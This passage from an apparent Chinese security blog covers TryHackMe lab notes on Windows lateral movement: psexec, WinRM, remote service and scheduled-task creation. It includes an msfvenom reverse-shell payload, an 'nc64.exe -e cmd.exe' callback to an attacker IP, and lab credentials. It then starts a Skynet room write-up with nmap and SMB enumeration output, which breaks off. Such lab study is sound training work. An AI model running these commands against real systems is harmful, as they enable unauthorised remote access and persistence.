class="line">psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe</span><br></pre></td></tr></table></figure><h3 id="使用-WinRM-远程创建进程"><a href="#使用-WinRM-远程创建进程" class="headerlink" title="使用 WinRM 远程创建进程"></a>使用 WinRM 远程创建进程</h3><ul><li><strong>Ports:</strong> 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS)<br>  <strong>端口：</strong> 5985&#x2F;TCP (WinRM HTTP ) 或 5986&#x2F; TCP (WinRM HTTPS)</li><li><strong>Required Group Memberships:</strong> Remote Management Users<br>  **所需的组成员身份：**远程管理用户</li></ul><p>远程管理员”这个术语强调的是管理操作的方式，而不仅仅是权限。即便某个用户是本地管理员，称为“远程管理员”是为了区分他们是通过远程工具（如远程桌面或 PsExec）来执行管理任务的。这种表述帮助明确管理员的管理操作是通过远程手段完成的，而不是在本地直接操作</p><p>Windows 远程管理 (WinRM) 是一种基于 Web 的协议，用于远程向 Windows 主机发送 Powershell 命令。大多数 Windows Server 安装都会默认启用 WinRM，这使其成为一个有吸引力的攻击媒介。</p><p>要从命令行连接到远程 Powershell 会话，我们可以使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs.exe -u:Administrator -p:Mypass123 -r:target cmd</span><br></pre></td></tr></table></figure><p>我们可以从 Powershell 实现相同的目的，但要传递不同的凭据，我们需要创建一个 PSCredential 对象：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;Administrator&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;Mypass123&#x27;</span>;</span><br><span class="line"><span class="variable">$securePassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>; </span><br><span class="line"><span class="variable">$credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$securePassword</span>;</span><br></pre></td></tr></table></figure><p>获得 PSCredential 对象后，我们可以使用 Enter-PSSession cmdlet 创建交互式会话：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enter-PSSession</span> <span class="literal">-Computername</span> TARGET <span class="literal">-Credential</span> <span class="variable">$credential</span></span><br></pre></td></tr></table></figure><p>Powershell 还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭证也必须通过 PSCredential 对象传递：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Computername</span> TARGET <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br></pre></td></tr></table></figure><h3 id="使用-sc远程创建服务"><a href="#使用-sc远程创建服务" class="headerlink" title="使用 sc远程创建服务"></a>使用 sc远程创建服务</h3><ul><li><strong>Ports: 端口：</strong><ul><li>135&#x2F;TCP, 49152-65535&#x2F;TCP (DCE&#x2F;RPC)<br>  135&#x2F; TCP ，49152-65535&#x2F; TCP （DCE&#x2F;RPC）</li><li>445&#x2F;TCP (RPC over SMB Named Pipes)<br>  445&#x2F; TCP （基于SMB命名管道的 RPC）</li><li>139&#x2F;TCP (RPC over SMB Named Pipes)<br>  139&#x2F; TCP （基于SMB命名管道的 RPC）</li></ul></li><li><strong>Required Group Memberships:</strong> Administrators<br>  **所需的组成员身份：**管理员</li></ul><p>Windows 服务也可用于运行任意命令，因为它们在启动时执行命令。虽然服务可执行文件在技术上与常规应用程序不同，但如果我们配置 Windows 服务来运行任何应用程序，它仍然会执行该应用程序并随后失败。启动服务居然可以任意执行相关命令 ，因此可以看到对应也可以执行对应的命令。</p><h5 id="PS一下相关的服务相关内容"><a href="#PS一下相关的服务相关内容" class="headerlink" title="PS一下相关的服务相关内容"></a>PS一下相关的服务相关内容</h5><h6 id="创建-Windows-服务时的注意事项："><a href="#创建-Windows-服务时的注意事项：" class="headerlink" title="创建 Windows 服务时的注意事项："></a>创建 Windows 服务时的注意事项：</h6><ol><li><p><strong>权限</strong>：</p><ul><li>Windows 服务通常在系统级别运行，因此需要相应的权限。确保你有足够的权限来创建和管理服务。</li><li>服务的账户可以是系统账户（如 LocalSystem、NetworkService）或特定用户账户。使用系统账户时，服务具有更高的权限，但也需要谨慎，以避免潜在的安全风险。</li></ul></li><li><p><strong>服务主程序</strong>：</p><ul><li>服务的主程序通常是一个可执行文件（<code>.exe</code>）。这个可执行文件必须符合 Windows 服务的要求，即能够响应启动、停止、暂停等控制命令。</li><li>常用的服务主程序框架包括 <code>.NET</code> 提供的 <code>ServiceBase</code> 类和 Windows API 提供的服务控制函数。</li></ul></li><li><p><strong>执行命令</strong>：</p><ul><li>在服务启动时，你可以通过服务的主程序执行命令。通常，这些命令包括启动必要的进程、初始化资源等。</li><li>在服务中执行命令时，需要处理好可能的错误和异常，以确保服务的稳定性。例如，启动时可能需要加载配置文件、建立网络连接等。</li></ul></li><li><p><strong>配置和管理</strong>：</p><ul><li>服务的配置通常存储在注册表中，或者通过配置文件来管理。你可以使用 <code>sc</code> 命令、<code>PowerShell</code> 脚本或服务控制面板来安装、启动、停止和删除服务。</li><li>在服务中执行命令时，确保命令的路径、环境变量等配置正确，以避免服务启动失败。</li></ul></li><li><p><strong>日志和监控</strong>：</p><ul><li>服务通常需要有适当的日志记录机制，以便监控其运行状态和排查故障。确保服务能够记录必要的日志信息，例如启动成功、错误信息等。</li></ul></li></ol><p>我们可以使用 sc.exe（Windows 中提供的标准工具）在远程主机上创建服务。使用sc时，它会通过几种方式尝试通过RPC连接到服务控制管理器（SVCCTL）远程服务程序：</p><ol><li> 将使用 DCE&#x2F;RPC 进行连接尝试。客户端将首先在端口 135 连接到端点映射器 (EPM)，该端点映射器充当可用 RPC 端点的目录并请求有关 SVCCTL 服务程序的信息。然后，EPM 将响应 IP 和端口以连接到 SVCCTL，该端口通常是 49152-65535 范围内的动态端口。 其实这是rpc 协议的连接过程，先通过对应的EPM  端点映射</li></ol><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png"></p><ol><li>如果后一个连接失败，sc 将尝试通过端口 445 ( SMB ) 或 139 ( SMB over NetBIOS ) 上的SMB命名管道到达 SVCCTL。</li></ol><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png" alt="svcctl via named pipe"><br>所以我感觉应该是两个协议 ，一个是对应的rpc一个是smb 但是对应的服务可以执行相关命令。<br>我们可以使用以下命令创建并启动名为“THMservice”的服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\TARGET create THMservice binPath= &quot;net user munra Pass123 /add&quot; start= auto</span><br><span class="line">sc.exe \\TARGET start THMservice</span><br></pre></td></tr></table></figure><p>服务启动时将执行“net user”命令，在系统上创建一个新的本地用户。由于操作系统负责启动服务，因此您将无法查看命令输出。</p><p>要停止并删除该服务，我们可以执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\TARGET stop THMservice</span><br><span class="line">sc.exe \\TARGET delete THMservice</span><br></pre></td></tr></table></figure><h3 id="Creating-Scheduled-Tasks-Remotely"><a href="#Creating-Scheduled-Tasks-Remotely" class="headerlink" title="Creating Scheduled Tasks Remotely"></a>Creating Scheduled Tasks Remotely</h3><p>**远程创建计划任务</p><p>我们可以使用的另一个 Windows 功能是计划任务。您可以使用 schtasks 远程创建并运行一个任务，该任务可在任何 Windows 安装中使用。要创建名为 THMtask1 的任务，我们可以使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;THMtask1&quot; /tr &quot;&lt;command/payload to execute&gt;&quot; /sc ONCE /sd 01/01/1970 /st 00:00 </span><br><span class="line"></span><br><span class="line">schtasks /s TARGET /run /TN &quot;THMtask1&quot; </span><br></pre></td></tr></table></figure><p>我们将计划类型 (&#x2F;sc) 设置为 ONCE，这意味着该任务仅在指定的时间和日期运行一次。由于我们将手动运行任务，因此开始日期 (&#x2F;sd) 和开始时间 (&#x2F;st) 无论如何都不重要。</p><p>由于系统将运行计划任务，因此我们将无法获得该命令的输出，这使得这是一种盲目攻击。</p><p>最后，要删除计划任务，我们可以使用以下命令并自行清理：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /S TARGET /TN <span class="string">&quot;THMtask1&quot;</span> /DELETE /F</span><br></pre></td></tr></table></figure><h3 id="实战实例"><a href="#实战实例" class="headerlink" title="实战实例"></a>实战实例</h3><p>针对特定的本地任务<br><strong>User:</strong> ZA.TRYHACKME.COM\t1_leonard.summers<br><strong>用户：</strong> ZA.TRYHACKME.COM\t1_leonard.summers</p><p><strong>Password:</strong> EZpass4ever<br><strong>密码：</strong> EZpass4ever</p><p>虽然我们已经展示了如何使用 sc 在远程系统上创建用户（通过使用<code>net user</code> ），但我们还可以上传我们想要执行的任何二进制文件并将其与创建的服务关联。但是，如果我们尝试使用此方法运行反向 shell，我们会注意到反向 shell 在执行后立即断开连接。原因是服务可执行文件与标准 .exe 文件不同，因此非服务可执行文件几乎会立即被服务管理器杀死。对我们来说幸运的是，msfvenom 支持<code>exe-service</code>格式，它将我们喜欢的任何有效负载封装在功能齐全的服务可执行文件中，防止它被杀死。</p><p>在 Windows 中，<code>.exe</code> 文件是可执行文件的标准扩展名，用于运行程序。而 <code>exe-service</code> 可能指的是在服务环境中运行的可执行程序，通常是 Windows 服务（Service），它们在后台运行并可以在系统启动时自动启动。</p><p><strong>主要区别</strong>：</p><ul><li><strong><code>.exe</code> 文件</strong>：直接运行的程序，用户可以通过双击打开。</li><li><strong>Windows 服务</strong>：在后台运行的程序，通常以 <code>Service</code> 模式启动和管理。它们可以用 <code>sc</code> 命令或服务管理工具（如服务控制面板）来安装和管理。</li></ul><p>因此分析一下目前我们的优势，首先我们目前有对应横向主机的一个管理员用户，并且此时我们准备打算采用sc.exe的方式来创建对应的一个服务同时来执行相关命令，我们不来创建用户我们来直接用一个服务的可执行文件，我们可以使用直接用这个负载来反弹一个shell。</p><p>但是此时我们准备横向的是THMIIS  并且此时我们已经拿到对应的相关的THMIIS 上的一个管理员的凭据 那么此时我准备尝试不同的方式去横向到对应的 服务器上。</p><h5 id="ssh尝试"><a href="#ssh尝试" class="headerlink" title="ssh尝试"></a>ssh尝试</h5><p>首先根据我们的主旨，我们需要横向到对应的主机。第一步肯定是伪装我们目前是处于一个thmjmp2 的机器上我目前还不知道它属于什么组。可以查一下经过命令查询可以看到它属于domain 和 internet组 但是我目前想知道他属于哪一个ou<br>由于我发现我目前的凭证并不是管理员用户，所以我无法使用cmdlet 和mmc 进行收集。此时使用猎狗sharphound </p><p>首先使用ssh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh t1_leonard.summers@thmiis.za.tryhackme.com </span><br></pre></td></tr></table></figure><p>成功</p><h5 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec64.exe \\thmiis.za.tryhackme.com  -u t1_leonard.summers   -p EZpass4ever -i cmd.exe</span><br></pre></td></tr></table></figure><p>这个不知道为啥一直失败</p><h5 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs.exe -u:t1_leonard.summers -p:EZpass4ever -r:thmiis.za.tryhackme.com  cmd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907211732.png" alt="image.png"></p><h5 id="sc-exe"><a href="#sc-exe" class="headerlink" title="sc.exe"></a>sc.exe</h5><p>windows服务相关的内容不再赘述，我们直接生成对应的exe-service</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.148.56 LPORT=4444 -o k1t0service.exe</span><br></pre></td></tr></table></figure><p>然后，我们将继续使用 t1_leonard.summers 凭据，使用 AttackBox 中的 smbclient 将有效负载上传到 THMIIS 的 ADMIN$ 共享：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -c &#x27;put k1t0service.exe&#x27; -U t1_leonard.summers -W ZA &#x27;//thmiis.za.tryhackme.com/admin$/&#x27; EZpass4ever</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907213326.png" alt="image.png"><br>上传可执行文件后，我们将在攻击者的计算机上设置一个侦听器以接收来自<code>msfconsole</code>的反向 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">user@AttackBox$ </span><span class="language-bash">msfconsole</span></span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST lateralmovement</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 4444</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/shell/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.16:4444</span><br></pre></td></tr></table></figure><p>由于<code>sc.exe</code>不允许我们在命令中指定凭据，因此我们需要使用<code>runas</code>来生成带有 t1_leonard.summer 访问令牌的新 shell。尽管如此，我们只能通过SSH访问机器，所以如果我们尝试类似的操作 <code>runas /netonly /user:ZA\t1_leonard.summers cmd.exe</code> ，新的命令提示符将在用户的会话中生成，但我们无法访问它。为了解决这个问题，我们可以使用 runas 生成带有 t1_leonard.summers 访问令牌的第二个反向 shell：<br>其实这句话看似很难理解，其实仔细想一想真的很难理解吗？ HAHAH 其实只是因为啥呢?只是因为我们是用攻击盒进行渗透的。所以如果说我们runas 之后&#x2F;netonly 我们在盒子上是看不到这个cmd 会话的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe -e cmd.exe 10.50.148.56 4443&quot;</span><br></pre></td></tr></table></figure><p>此时需要在盒子上开一个nc -nvlp 4443<br>最后，继续使用 sc 远程创建一个新服务，并将其与我们上传的二进制文件关联起来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc.exe \\thmiis.za.tryhackme.com create THMservice-3244 binPath= &quot;%windir%\k1t0service.exe&quot; start= auto</span><br><span class="line">C:\&gt; sc.exe \\thmiis.za.tryhackme.com start THMservice-3244</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240908100905.png" alt="image.png"></p><p>成功使用sc 服务反弹回来一个shell ，并且是根据一个负载和一个服务捆绑。<br>但是一定要注意，我们的服务名称和一个服务的路径一定要是独属于自己的。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>看似我们在横向移动，其实我们这种方式是非常鸡肋的。我们无论是psexec，winrm ，定时任务，sc服务，ssh，rdp进行一个横向我们都是需要一个管理员用户的……..可以称为这个集合为我们拿到一定的凭据之后可以采用的一些姿势。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thm-Skynet</title>
      <link href="/2024/08/17/Thm-Skynet/"/>
      <url>/2024/08/17/Thm-Skynet/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>机器信息</th><th>Skynet</th></tr></thead><tbody><tr><td>系统</td><td>linux</td></tr><tr><td>信息</td><td>有点意思 使用smb  匿名访问 找到相关的 用户信息之后依旧是目录扫描扫到了 一个旁站是一个邮箱系统 可以试着登陆成功进入smb系统  之后再邮件系统中找到 更改密码的 登陆可以找到 一个milesdyson的 私人目录 可以看到一个新的cms 之后就可以找到一个nday 远程文件包含 可以getshell 后使用 内核提权 拿到root权限</td></tr></tbody></table><h3 id="0X01循例信息收集"><a href="#0X01循例信息收集" class="headerlink" title="0X01循例信息收集"></a>0X01循例信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-14 09:20 UTC</span><br><span class="line">Nmap scan report for ip-10-10-14-193.eu-west-1.compute.internal (10.10.14.193)</span><br><span class="line">Host is up (0.0054s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">110/tcp open  pop3</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">143/tcp open  imap</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 02:58:B4:7D:6E:6D (Unknown)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">详细扫描</span></span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)</span><br><span class="line">|   256 57c07502712d193183dbe4fe679668cf (ECDSA)</span><br><span class="line">|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Skynet</span><br><span class="line">110/tcp open  pop3        Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: TOP CAPA SASL RESP-CODES UIDL AUTH-RESP-CODE PIPELINING</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp open  imap        Dovecot imapd</span><br><span class="line">|_imap-capabilities: IDLE ID SASL-IR post-login ENABLE Pre-login more capabilities have LITERAL+ OK LOGIN-REFERRALS listed LOGINDISABLEDA0001 IMAP4rev1</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 02:58:B4:7D:6E:6D (Unknown)</span><br><span class="line"></span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 3.13 (99%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.8 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-06-14T09:22:35</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: skynet</span><br><span class="line">|   NetBIOS computer name: SKYNET\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: skynet</span><br><span class="line">|_  System time: 2024-06-14T04:22:35-05:00</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.54 ms ip-10-10-14-193.eu-west-1.compute.internal (10.10.14.193)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0X02资产梳理"><a href="#0X02资产梳理" class="headerlink" title="0X02资产梳理"></a>0X02资产梳理</h4><h3 id="0X10开放端口及服务"><a href="#0X10开放端口及服务" class="headerlink" title="0X10开放端口及服务"></a>0X10开放端口及服务</h3><ol><li><p><strong>22&#x2F;tcp - SSH</strong></p><ul><li><strong>服务</strong>: OpenSSH 7.2p2 (Ubuntu 4ubuntu2.8)</li><li><strong>操作系统</strong>: Ubuntu Linux</li><li><strong>协议</strong>: SSH协议版本 2.0</li><li><strong>SSH Hostkeys</strong>:<ul><li>RSA 2048-bit key fingerprint: 992331bbb1e943b756944cb9e82146c5</li><li>ECDSA 256-bit key fingerprint: 57c07502712d193183dbe4fe679668cf</li><li>ED25519 256-bit key fingerprint: 46fa4efc10a54f5757d06d54f6c34dfe</li></ul></li></ul></li><li><p><strong>80&#x2F;tcp - HTTP</strong></p><ul><li><strong>服务</strong>: Apache HTTP Server 2.4.18 (Ubuntu)</li><li><strong>HTTP服务器头</strong>: Apache&#x2F;2.4.18 (Ubuntu)</li><li><strong>HTTP标题</strong>: Skynet</li></ul></li><li><p><strong>110&#x2F;tcp - POP3</strong></p><ul><li><strong>服务</strong>: Dovecot pop3d</li><li><strong>POP3能力</strong>: TOP, CAPA, SASL, RESP-CODES, UIDL, AUTH-RESP-CODE, PIPELINING</li></ul></li><li><p><strong>139&#x2F;tcp 和 445&#x2F;tcp - NetBIOS&#x2F;SMB</strong></p><ul><li><strong>服务</strong>: Samba smbd 4.3.11-Ubuntu</li><li><strong>工作组</strong>: WORKGROUP</li></ul></li><li><p><strong>143&#x2F;tcp - IMAP</strong></p><ul><li><strong>服务</strong>: Dovecot imapd</li><li><strong>IMAP能力</strong>: IDLE, ID, SASL-IR, post-login, ENABLE, Pre-login, LITERAL+, OK, LOGIN-REFERRALS, LOGINDISABLEDA0001, IMAP4rev1</li></ul></li></ol><h3 id="主机信息"><a href="#主机信息" class="headerlink" title="主机信息"></a>主机信息</h3><ul><li><strong>MAC地址</strong>: 02:58:B4:7D:6E:6D (未知制造商)</li><li><strong>主机名</strong>: SKYNET</li><li><strong>操作系统猜测</strong>:<ul><li>主要为各种版本的Linux（例如3.10 - 3.13, 5.4, 3.16等）</li><li>Android操作系统（5.1, 7.1.1 - 7.1.2）</li></ul></li></ul><h3 id="网络距离"><a href="#网络距离" class="headerlink" title="网络距离"></a>网络距离</h3><ul><li>目标主机与扫描主机之间的网络跳数：1 hop</li></ul><h3 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h3><ul><li><strong>时间偏移</strong>: 平均时钟偏移约为1小时40分钟</li><li><strong>SMB安全模式</strong>:<ul><li>消息签名已启用但不强制</li></ul></li><li><strong>NetBIOS信息</strong>: 计算机名为SKYNET，域名为空</li><li><strong>SMB时间</strong>: 当前时间为2024年6月14日09:22:35（UTC）</li></ul><blockquote><p>**目前不能偏向究竟是何种操作系统 根据不同服务 可以看到不同的服务</p></blockquote><h3 id="0x20-smb445"><a href="#0x20-smb445" class="headerlink" title="0x20 smb445"></a>0x20 smb445</h3><blockquote><p>先试试samba 4.3.11<br>暂时搁置 脚本扫一遍smb 协议</p></blockquote><table><thead><tr><th>smb 445</th><th>[[smb 445#namp 脚本探测]]</th></tr></thead></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-enum-shares: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   \\10.10.14.193\IPC$: </span><br><span class="line">|     Type: STYPE_IPC_HIDDEN</span><br><span class="line">|     Comment: IPC Service (skynet server (Samba, Ubuntu))</span><br><span class="line">|     Users: 2</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\tmp</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">|     Current user access: READ/WRITE</span><br><span class="line">|   \\10.10.14.193\anonymous: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Skynet Anonymous Share</span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\srv\samba</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">|     Current user access: READ/WRITE</span><br><span class="line">|   \\10.10.14.193\milesdyson: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Miles Dyson Personal Share</span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\home\milesdyson\share</span><br><span class="line">|     Anonymous access: &lt;none&gt;</span><br><span class="line">|     Current user access: &lt;none&gt;</span><br><span class="line">|   \\10.10.14.193\print$: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Printer Drivers</span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\var\lib\samba\printers</span><br><span class="line">|     Anonymous access: &lt;none&gt;</span><br><span class="line">|_    Current user access: &lt;none&gt;</span><br><span class="line">| smb-enum-users: </span><br><span class="line">|   SKYNET\milesdyson (RID: 1000)</span><br><span class="line">|     Full name:   </span><br><span class="line">|     Description: </span><br><span class="line">|_    Flags:       Normal user account</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>可得信息</p></blockquote><ol><li><p><strong>共享信息</strong>：</p><ul><li><strong>IPC$</strong>: 这是一个隐藏的IPC服务，允许匿名用户进行读写访问。路径为 <code>C:\tmp</code>。</li><li><strong>anonymous</strong>: 这是一个匿名共享，允许匿名用户进行读写访问。路径为 